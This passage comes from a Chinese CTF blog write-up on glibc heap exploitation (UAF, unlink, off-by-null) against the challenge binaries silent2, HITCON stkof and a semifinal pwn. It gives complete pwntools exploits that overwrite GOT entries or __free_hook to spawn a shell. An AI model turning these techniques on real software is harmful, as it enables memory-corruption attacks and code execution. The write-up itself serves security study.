sub_400B2F();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">1</span>:</span><br><span class="line">        sub_4009DC();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, content1, content2)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br></pre></td></tr></table></figure>

<p>可以看到是没有puts函数可以打印的，但是这题的思路相对清晰，就是利用UAF漏洞，先malloc5个chunk块（大于0x80），0,1,2,3,4，其中2chunk写入“、bin/sh\x00”，因为看到了system函数，可以直接调用的，然后free掉3和4，再申请一个大的块时就会得到之前free的两个块，上面的信息也会保留，于是可以构造fake_chunk了，这里先构造一个fake_chunk1用于unlink，接着构造第二个fake_chunk2，将第一个fake_chunk状态置为0，同时修改下一个chunk4的大小使其满足fake_chunk1+fake_chunk2 = 大的malloc的chunk。接着我们再free掉4号chunk,（double free）就会向后合并，从而使得chunk3的地址指针指向chunk0，接着再往chunk3写入free的got，再接着往chunk0写入system，然后free掉2号chunk，即可getshell~</p>
<p><img src="/blog_img/1563463831035.png" alt="1563463831035"></p>
<p>直接上exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./silent2'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./silent2'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, content1, content2)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'king'</span>) <span class="comment"># 自己创建的banner.txt文件的内容</span></span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x4009C0</span></span><br><span class="line">free_got_plt = <span class="number">0x602018</span></span><br><span class="line">p_addr = <span class="number">0x6020D8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#bk(0x0000000000400A4F)</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'DDDD'</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'EEEEE'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(p_addr - <span class="number">0x18</span>) + p64(p_addr - <span class="number">0x10</span>) + <span class="string">'A'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) + p64(<span class="number">0x100</span>) + p64(</span><br><span class="line">    <span class="number">0x210</span> - <span class="number">0x100</span>) <span class="comment"># 构造两个chunk，绕过unlink的检查</span></span><br><span class="line">create(<span class="number">0x210</span>, payload)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">modify(<span class="number">3</span>, p64(free_got_plt)[<span class="number">0</span>:<span class="number">4</span>], <span class="string">'1111'</span>)</span><br><span class="line">modify(<span class="number">0</span>, p64(func_addr)[<span class="number">0</span>:<span class="number">6</span>], <span class="string">'2222'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这题和堆块下溢本质上是差不多的，区别在于没有puts函数和下溢漏洞，但是有UAF漏洞，就可以实现构造fake_chunk，这和第一题是很像的，和下溢的操作是差不多的。</p>
<p>堆溢出，还有一种情况就是当我们的puts无法调用时，无法打印出堆块上面的内容时，我们可以间接调用法，通过unlink写入free的got，然后再写一次往free的got写入puts_plt，那么就可以实现free调用就是调用puts函数，只要free一个带有got表的堆块，我们就可以实现puts打印功能了，接着再次改写free的got为onegadget或者atoi的got为system，传参数（/bin/sh\x00）即可实现getshell~</p>
<p>上题目：</p>
<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>由于利用思路都是一样的，堆溢出构造fake_chunk，然后unlink攻击，所以直接上exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,Content)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    sl(str(size))</span><br><span class="line">    sd(Content)</span><br><span class="line">    ru(<span class="string">'OK\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(Index)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    sl(str(Index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602150</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x30</span>)<span class="comment">#2</span></span><br><span class="line">bk(<span class="number">0x400981</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#3</span></span><br><span class="line">FD = ptr - <span class="number">0x18</span></span><br><span class="line">BK = ptr - <span class="number">0x10</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">16</span></span><br><span class="line">py += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,py)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">py1 = <span class="string">''</span></span><br><span class="line">py1 += p64(<span class="number">0</span>) + p64(atoi_got) + p64(puts_got) + p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,len(py1),py1)</span><br><span class="line">py2 = <span class="string">''</span></span><br><span class="line">py2 += p64(puts_plt)</span><br><span class="line">edit(<span class="number">2</span>,len(py2),py2)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(ru(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr---&gt;"</span> + hex(puts_addr)</span><br><span class="line">onegadget = puts_addr - libc.symbols[<span class="string">"puts"</span>] + <span class="number">0xf02a4</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"onegadget---&gt;"</span> + hex(onegadget)</span><br><span class="line">system = puts_addr - libc.symbols[<span class="string">"puts"</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment"># edit(2,0x8,p64(onegadget))</span></span><br><span class="line"><span class="comment"># free(2)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">sl(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下面是半决赛的一道unlink的题目总结：</p>
<p>首先看下保护机制：</p>
<p><img src="/blog_img/1563538104788.png" alt="1563538104788"></p>
<p>看到保护机制，想到要想getshell，只有通过修改__free_hook的地址为我们的onegadget，先埋下伏笔，这里分析开始漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        menu();</span><br><span class="line">        v3 = read_int();</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fr();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      ma();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ed();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      sh();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提取出函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,Content)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'3'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(<span class="string">"content:"</span>)</span><br><span class="line">	sd(Content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(Index)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(Index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'1'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line">	ru(<span class="string">"size:"</span>)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(<span class="string">"content:"</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">	ru(<span class="string">"show"</span>)</span><br><span class="line">	sl(<span class="string">'4'</span>)</span><br><span class="line">	ru(<span class="string">"index:"</span>)</span><br><span class="line">	sl(str(index))</span><br></pre></td></tr></table></figure>

<p>首先是malloc函数，发现很正常，输入下标，大小和内容：</p>
<p><img src="/blog_img/1563538273935.png" alt="1563538273935"></p>
<p>接着是free函数：</p>
<p><img src="/blog_img/1563538500301.png" alt="1563538500301"></p>
<p>接着edit函数：</p>
<p><img src="/blog_img/1563538463848.png" alt="1563538463848"></p>
<p>最后是puts函数，key2应该是0，所以用不了打印函数：</p>
<p><img src="/blog_img/1563538550431.png" alt="1563538550431"></p>
<p>bss段中key1和key2，掌控着edit函数的使用次数和puts函数的打印功能，而且细心会发现，其实只要填到key2，因为地址占用8位，那么key1也是会被覆盖成1的，问题是要修改这里的值，得下溢，所以得往上找注入点：</p>
<p><img src="/blog_img/1563538651286.png" alt="1563538651286"></p>
<p><img src="/blog_img/1563539102454.png" alt="1563539102454"></p>
<h4 id="如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0-0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18-0xd8-0xf0，也就是要填充0xf0的junk-string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。"><a href="#如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0-0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18-0xd8-0xf0，也就是要填充0xf0的junk-string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。" class="headerlink" title="如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0 = 0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18+0xd8=0xf0，也就是要填充0xf0的junk string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。"></a>如果我们可以往chunk32的地址0x6021E0处写入内容的话，就可以实现下溢，0x6022b8-0x6021E0 = 0xd8字节，也就是从这里开始输入要输入0xd8的字节，同时chunk32是我们能控制的最后一个chunk块，unlink后输入的位置是chunk29的地址，有0x18的距离，0x18+0xd8=0xf0，也就是要填充0xf0的junk string，然后再写入8字节的数字，所以一共需要0xf8的大小，即堆块的大小必须要是0xf8才行，这是第一个坑点，需要计算出要malloc的堆块大小。</h4><p>接着因为off by null的原理是在输入最后加上一个\x00，溢出一个字节，那么就可以想到修改上一个堆块的状态为free，于是想到可以用unlink的做法实现chunk32的地址指向chunk29，那么我们可以构造出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">32</span>,<span class="number">0xf8</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">'cccc'</span>)</span><br><span class="line">malloc(<span class="number">31</span>,<span class="number">0xf8</span>,<span class="string">'dddd'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">ptr = <span class="number">0x6021E0</span><span class="comment">#32</span></span><br><span class="line">FD = ptr - <span class="number">24</span></span><br><span class="line">BK = ptr - <span class="number">16</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0xf0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">py += p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">32</span>,py)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>我们先申请4个堆块，然后在chunk32里面做文章，构造出我们的unlink链子，由于off by one的漏洞，会把chunk1的size字节低位置为0，那么就是说我们的fake_chunk是free状态的，这时我们如果free掉chunk1，就会触发unlink从而实现了chunk32指向chunk29，如果我们edit了chunk32，就会从chunk29开始输入，下面一步步看下具体的过程，首先是申请：</p>
<p><img src="/blog_img/1563540226779.png" alt="1563540226779"></p>
<p>接着是fake_chunk的构造：方框是fake_chunk，圆圈是我们的offbyone漏洞，使得我们的fake_chunk为free状态</p>
<p><img src="/blog_img/1563540350067.png" alt="1563540350067"></p>
<p><img src="/blog_img/1563540441908.png" alt="1563540441908"></p>
<p>unlink一下：</p>
<p><img src="/blog_img/1563540498333.png" alt="1563540498333"></p>
<p><img src="/blog_img/1563540667946.png" alt="1563540667946"></p>
<p>一个unlink实现了泄露出libc基地址和0x6021e0指向0x6021c8，接着再改写key1和key2：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(<span class="number">0x6021E0</span>)*<span class="number">3</span> + p64(free_got)<span class="comment">#0x20</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0xD0</span></span><br><span class="line">py += p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">32</span>,py)</span><br></pre></td></tr></table></figure>

<p>下图中key2为0，key1位1（改写前），可edit不可puts</p>
<p><img src="/blog_img/1563541459355.png" alt="1563541459355"></p>
<p>下图中key2为1，key1位0（改写后）可edit可puts</p>
<p><img src="/blog_img/1563541492644.png" alt="1563541492644"></p>
<p>这里很巧妙的一点就是chunk29到chunk31都填写chunk32的地址，也就是往chunk29到chunk31写入内容实则都是往chunk32写入内容，那么我们可以进行真实地址泄露了，这里可以puts出chunk32上面的free的真实地址，也可以通过打印1号块的内容来泄露main_arena地址（unsorted bin攻击），打印完了我们就可以得到system和onegadget和free_hook的地址，然后将free_hook地址写入到chunk32中，再往chunk32写入onegadget：</p>
<p>上exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = 